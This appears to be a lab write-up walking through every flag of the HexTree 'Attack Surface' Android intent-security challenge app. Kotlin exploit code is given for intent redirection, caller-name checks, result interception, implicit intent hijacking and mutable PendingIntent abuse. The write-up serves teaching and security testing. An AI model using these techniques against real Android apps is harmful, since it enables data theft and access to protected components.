The HexTree "Attack Surface" challenge app exposes every flavor of intent-based vulnerability - from trivial exported activity launches all the way to PendingIntent abuse on Android 15. This is a full walkthrough of every flag, the technique behind each one, and the real-world bugs they map to.

The POC app that I built is a Kotlin Android app (`com.vishal2376.hextreepoc`) that sends crafted intents to the target (`io.hextree.attacksurface`). All code uses a central `Attack` class and a `HextreeActivity` whose name is carefully chosen (more on that later).

---

## Setup and Tools

**What you need:**

- Android Studio (any recent version)
- Target APK: `io.hextree.attacksurface` installed on a device or emulator
- JADX for decompiling: `brew install jadx` or grab the GUI from GitHub
- ADB for inspection

This walkthrough is based on the HexTree course [Intent Threat Surface](https://app.hextree.io/courses/intent-threat-surface/intents-and-activities) - if you want guided video lessons alongside this written walkthrough, that course is the place to start.

```bash
# Verify target is installed
adb shell pm list packages | grep hextree

# Dump all exported components
adb shell dumpsys package io.hextree.attacksurface | grep -A2 "Activity"
```

The key rule throughout this challenge: **always decompile first**. Every flag's solution is sitting in the `onCreate()` or `onNewIntent()` of the target activity. JADX makes it readable in seconds.

---

## Flag 1 - Direct Activity Launch

**Technique:** Explicit Intent

Flag 1 is a sanity check. The activity is exported with no guards - just launch it directly using `setClassName()`.

```kotlin
fun flag1() {
    val activityPath = "io.hextree.attacksurface.activities.Flag1Activity"

    val intent = Intent()
    intent.setClassName(packageName, activityPath)
    context.startActivity(intent)
}
```

Any exported activity with `android:exported="true"` and no additional checks can be launched directly from any other app. No permissions required.

---

## Flag 2 - Custom Action Intent

**Technique:** Intent Action Matching

The activity checks `intent.getAction()` and expects an exact string before doing anything useful. Decompile the activity, find the string, set it.

```kotlin
fun flag2() {
    val activityPath = "io.hextree.attacksurface.activities.Flag2Activity"

    val intent = Intent()
    intent.setClassName(packageName, activityPath)
    intent.action = "io.hextree.action.GIVE_FLAG"
    context.startActivity(intent)
}
```

Action strings in intent filters are not secrets. They live in the manifest and the decompiled bytecode. Security-through-obscurity with action strings is not security.

---

## Flag 3 - Action + URI Data

**Technique:** Intent Action + Data URI

Flag 3 validates both `getAction()` and `getDataString()`. Both must match simultaneously. Miss either and the activity silently returns.

```kotlin
fun flag3() {
    val activityPath = "io.hextree.attacksurface.activities.Flag3Activity"

    val intent = Intent()
    intent.setClassName(packageName, activityPath)
    intent.action = "io.hextree.action.GIVE_FLAG"
    intent.data = "https://app.hextree.io/map/android".toUri()
    context.startActivity(intent)
}
```

This pattern is common in deep-link handling - apps validate both the intent action and the URI scheme/host. If the activity is exported and the expected URI is discoverable by decompiling, you can craft the exact intent to trigger any code path.

---

## Flag 4 - State Machine Exploitation

**Technique:** Sequential Intent Sending

This one requires reading the decompiled code carefully. The activity stores an integer state in `SharedPreferences` and transitions only when it receives the correct action for the current state:

```
INIT -> PREPARE -> BUILD -> GET_FLAG -> success()
```

Each step requires its own action string. Send them out of order and you reset to `INIT`. The fix is to send them sequentially with timed delays:

```kotlin
fun flag4() {
    val activityPath = "$packageName.activities.Flag4Activity"

    val actions = listOf(
        "PREPARE_ACTION",   // INIT -> PREPARE
        "BUILD_ACTION",     // PREPARE -> BUILD
        "GET_FLAG_ACTION",  // BUILD -> GET_FLAG
        null                // GET_FLAG -> success() (any intent triggers)
    )

    actions.forEachIndexed { i, action ->
        val intent = Intent()
        intent.setClassName(packageName, activityPath)
        intent.action = action
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

        Handler(Looper.getMainLooper()).postDelayed({
            context.startActivity(intent)
        }, i * 500L)
    }
}
```

The `null` at the end is intentional - when the state is already `GET_FLAG`, any intent triggers `success()`. The 500ms delay between steps gives each activity launch time to write its state before the next one reads it. Go too fast and you will keep resetting.

---

## Flag 5 - Nested Intent (Intent-in-Intent)

**Technique:** Intent Extras Nesting

Flag 5 introduces a three-layer nested intent structure. The activity pulls an inner intent out of the `"android.intent.extra.INTENT"` extra, checks conditions on it, then checks a `nextIntent` inside that. Every layer has its own validation:

```
intent (outer)
 └── "android.intent.extra.INTENT" = intent2
     ├── return = 42
     └── "nextIntent" = intent3
         └── reason = "back"  <- triggers success()
```

```kotlin
fun flag5() {
    val activityPath = "$packageName.activities.Flag5Activity"

    // Level 3: nextIntent with reason="back" triggers success() directly
    val intent3 = Intent().apply {
        setClassName(packageName, activityPath)
        putExtra("reason", "back")
    }

    // Level 2: inner intent with return=42 and nextIntent attached
    val intent2 = Intent().apply {
        setClassName(packageName, activityPath)
        putExtra("return", 42)
        putExtra("nextIntent", intent3)
    }

    // Level 1: outer intent wrapping inner intent in standard extra key
    val intent = Intent().apply {
        setClassName(packageName, activityPath)
        putExtra("android.intent.extra.INTENT", intent2)
    }

    context.startActivity(intent)
}
```

Trace every `getParcelableExtra()` call in the decompiled code to map the full structure before writing a single line. Each layer may have its own conditions.

---

## Flag 6 - Intent Redirect to Non-Exported Activity

**Technique:** Intent Redirection via Exported Activity

`Flag6Activity` has `android:exported="false"`. You cannot launch it directly. But `Flag5Activity` is exported and blindly calls `startActivity(nextIntent)` when `reason="next"`. That makes Flag5 a launchpad.

The condition inside Flag6 is simple: check if `FLAG_GRANT_READ_URI_PERMISSION` (value `0x1`) is set on the incoming intent's flags. Set it on the innermost intent and route it through Flag5:

```kotlin
fun flag6() {
    val activityPath = "$packageName.activities.Flag5Activity"
    val newActivityPath = "$packageName.activities.Flag6Activity"

    // Target: Flag6 with required flag set
    val intent3 = Intent().apply {
        setClassName(packageName, newActivityPath)
        putExtra("reason", "next")
        flags = Intent.FLAG_GRANT_READ_URI_PERMISSION  // (flags & 1) != 0 -> success()
    }

    // Inner: satisfies Flag5's return=42 check, carries nextIntent
    val intent2 = Intent().apply {
        setClassName(packageName, activityPath)
        putExtra("return", 42)
        putExtra("nextIntent", intent3)
    }

    // Outer: sent to exported Flag5 which forwards nextIntent
    val intent = Intent().apply {
        setClassName(packageName, activityPath)
        putExtra("android.intent.extra.INTENT", intent2)
        flags = Intent.FLAG_ACTIVITY_NEW_TASK
    }

    context.startActivity(intent)
}
```

This is a real CVE-class vulnerability called **Intent Redirection**. An exported component that starts an activity from attacker-controlled intent data can be used to reach any non-exported component in the same app. On Android 12+, Intent Redirect Hardening blocks this - but on Android 10/11 it works cleanly.

---

## Flag 7 - onNewIntent() Lifecycle Exploitation

**Technique:** Activity Lifecycle Abuse via FLAG_ACTIVITY_SINGLE_TOP

Most people analyze `onCreate()` and stop there. Flag 7 exists to make sure you don't. The activity checks `action="OPEN"` in `onCreate()` and `action="REOPEN"` in `onNewIntent()`. `onNewIntent()` only fires when the activity is already running on top of the stack and a new intent arrives with `FLAG_ACTIVITY_SINGLE_TOP`.

```kotlin
fun flag7() {
    val activityPath = "$packageName.activities.Flag7Activity"

    // Step 1: launch and initialize activity
    val intent = Intent().apply {
        setClassName(packageName, activityPath)
        action = "OPEN"
        flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
    }
    context.startActivity(intent)

    // Step 2: trigger onNewIntent() after activity is fully created
    Handler(Looper.getMainLooper()).postDelayed({
        val newIntent = Intent().apply {
            setClassName(packageName, activityPath)
            action = "REOPEN"
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        context.startActivity(newIntent)
    }, 500)
}
```

The 500ms delay is non-negotiable. If you send the second intent before the activity is initialized, it creates a new instance and `onNewIntent()` never fires. Always check both `onCreate()` and `onNewIntent()` - they are independent attack surfaces.

---

## Flag 8 - Caller Identity Verification Bypass

**Technique:** startActivityForResult + Caller Class Name Spoofing

Flag 8 calls `getCallingActivity()` and checks if the class name contains `"Hextree"`. This only works if the activity was started via `startActivityForResult()` - with `startActivity()`, `getCallingActivity()` returns null and the check fails silently.

The trick: name your POC activity `HextreeActivity`. Android sets `getCallingActivity()` to whoever calls `startActivityForResult()`, and you can not spoof it at runtime. The class name must genuinely contain the expected substring.

```kotlin
fun flag8() {
    val activityPath = "$packageName.activities.Flag8Activity"

    val intent = Intent().apply {
        setClassName(packageName, activityPath)
    }
    // activity = HextreeActivity instance
    // getCallingActivity() = "HextreeActivity" contains "Hextree" -> passes check
    activity.startActivityForResult(intent, 8)
}
```

`getCallingActivity()` is determined by whoever calls `startActivityForResult()`. You cannot spoof it at runtime - the calling activity's class name must genuinely contain the expected string.

---

## Flag 9 - Result Data Stealing

**Technique:** Caller Identity Spoofing + Result Interception

Flag 9 uses the same caller check as Flag 8, but the target also sends back sensitive data via `setResult(-1, intent)`. A malicious app becomes the caller, collects the result, and extracts the flag from the returned intent.

```kotlin
fun flag9() {
    val activityPath = "$packageName.activities.Flag9Activity"

    // Launch Flag9 via startActivityForResult from HextreeActivity
    // getCallingActivity() = "HextreeActivity" contains "Hextree"
    // Flag9 calls setResult(-1, intent) sending flag back to onActivityResult()
    val intent = Intent().apply {
        setClassName(packageName, activityPath)
    }
    activity.startActivityForResult(intent, 9)
}
```

Capture the returned flag in `onActivityResult()`:

```kotlin
override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
    super.onActivityResult(requestCode, resultCode, data)

    if (requestCode == 9) {
        Utils.showDialog(this, data)  // data contains the stolen flag
    }
}
```

`setResult()` sends data back to the caller. A malicious app can steal sensitive results this way. Real-world apps should verify the caller's full package name, not just a substring of the class name.

---

## Flag 12 - Implicit Intent Interception

**Technique:** Intent Filter Registration + Result Manipulation

Flag 12 calls `startActivityForResult()` with an implicit intent - action `"io.hextree.attacksurface.ATTACK_ME"` - with no explicit component. Android resolves this to any installed app that has registered a matching intent filter.

Register your activity for that action in `AndroidManifest.xml`:

```xml
<activity android:name=".ImplicitIntentActivity" android:exported="true">
    <intent-filter>
        <action android:name="io.hextree.attacksurface.ATTACK_ME"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

Launch Flag12 with `LOGIN=true` (required by its `onActivityResult()` check):

```kotlin
fun flag12() {
    val activityPath = "$packageName.activities.Flag12Activity"

    val intent = Intent().apply {
        setClassName(packageName, activityPath)
        putExtra("LOGIN", true)             // required - onActivityResult checks this
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    context.startActivity(intent)
}
```

In `ImplicitIntentActivity`, intercept and return the magic token:

```kotlin
// Intercept Flag12's implicit intent and return expected token
if (intent.action == "io.hextree.attacksurface.ATTACK_ME") {
    val result = Intent().apply {
        putExtra("token", 1094795585)       // 0x41414141 - magic value Flag12 checks
    }
    setResult(Activity.RESULT_OK, result)
    finish()
}
```

Implicit intents are resolved to any matching app. Never use `startActivityForResult()` with implicit intents for sensitive operations - a malicious app can register for the same action and respond with crafted data.

---

## Flag 22 - PendingIntent Abuse

**Technique:** PendingIntent as Attack Vector

Flag 22 expects a mutable `PendingIntent` in the `"PENDING"` extra. It fills `success=true` and the flag into the PendingIntent, then calls `pendingIntent.send()` to fire it back. We provide a PendingIntent wrapping our own `HextreeActivity` with `FLAG_ACTIVITY_SINGLE_TOP` so `onNewIntent()` receives the delivery.

```kotlin
fun flag22() {
    val activityPath = "$packageName.activities.Flag22Activity"

    // Receiver intent: points back to our HextreeActivity
    // FLAG_ACTIVITY_SINGLE_TOP ensures onNewIntent() is called
    // instead of creating a new HextreeActivity instance
    val receiverIntent = Intent(context, HextreeActivity::class.java).apply {
        action = "FLAG22_RESULT"
        addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
    }

    // FLAG_MUTABLE: allows Flag22 to add extras (flag, success) before sending
    // FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT: required on Android 15 for PendingIntent delivery
    val pendingIntent = PendingIntent.getActivity(
        context,
        22,
        receiverIntent,
        PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT
    )

    // Send PendingIntent to Flag22 - it fills in flag data and fires it back
    val intent = Intent().apply {
        setClassName(packageName, activityPath)
        putExtra("PENDING", pendingIntent)
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    context.startActivity(intent)
}
```

Capture the result in `HextreeActivity`:

```kotlin
override fun onNewIntent(intent: Intent?) {
    super.onNewIntent(intent)
    if (intent?.action == "FLAG22_RESULT") {
        Utils.showDialog(this, intent)
    }
}
```

`FLAG_MUTABLE` is the critical part. Without it, Flag22 cannot inject extras into our PendingIntent and the send fails silently. On Android 15, `FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT` is additionally required due to stricter PendingIntent delivery enforcement.

The real-world danger: if an app gives you a mutable PendingIntent, you can fill in arbitrary extras before firing it. This has been used to escalate privileges, hijack notifications, and exfiltrate data from system services.

---

## Common Pitfalls

**Missing `FLAG_ACTIVITY_NEW_TASK`** - When launching from a non-activity context (like a Service or Application), you must add this flag or Android will crash with a runtime exception.

**Timing issues in sequential intents** - Flag 4 and Flag 7 both require timing. If your delays are too short, state has not been written yet when the next intent arrives. 500ms is usually safe; on slow emulators, go to 1000ms.

**`packageName` pointing to your app** - A subtle but painful bug. If you define `private val packageName = "io.hextree.attacksurface"` in your Attack class but forget it and use `context.packageName` somewhere, every `setClassName` silently targets your own app instead of the target.

**`getCallingActivity()` returning null** - You called `startActivity()` instead of `startActivityForResult()`. The caller is only set for result-based launches. Or you called `startActivityForResult()` from a non-activity context - it must come from an actual `Activity` instance.

**Intent Redirect Hardening on Android 12+** - The Flag 6 approach works on Android 10/11 but throws a `SecurityException` on Android 12+ devices. The error message explicitly names `intentCreatorUid` and `callingUid`. If you are on a modern device, adb with root or Frida are your options.

**Immutable PendingIntents (Flag 22)** - Without `FLAG_MUTABLE`, the target app cannot fill extras into your PendingIntent before sending. Always use `FLAG_MUTABLE` when you need the recipient to modify the intent before firing it.

---

## What's Next

**Content Providers** - The next major Android attack surface. Think SQL injection via `ContentResolver.query()`, path traversal via malformed content URIs, and unauthorized data access through exported providers with no permissions. The decompile-first approach is identical.

**Broadcast Receivers** - Everything from this module applies, but broadcasts are fire-and-forget. Exported receivers with no permissions are trivially exploitable. Ordered broadcasts add another layer of attack surface via `abortBroadcast()`.

**Frida for runtime patching** - When hardening blocks your crafted intents at the OS level (as in Flag 6 on Android 12+), Frida lets you hook inside the target process and patch checks or call methods directly. The Flag 6 Frida approach - cloning the intent inside the target's process to reset `intentCreatorUid` - is a technique worth understanding deeply.

_All testing was done against the HexTree Attack Surface app for educational purposes. Course: [Intent Threat Surface on HexTree](https://app.hextree.io/courses/intent-threat-surface/intents-and-activities)_
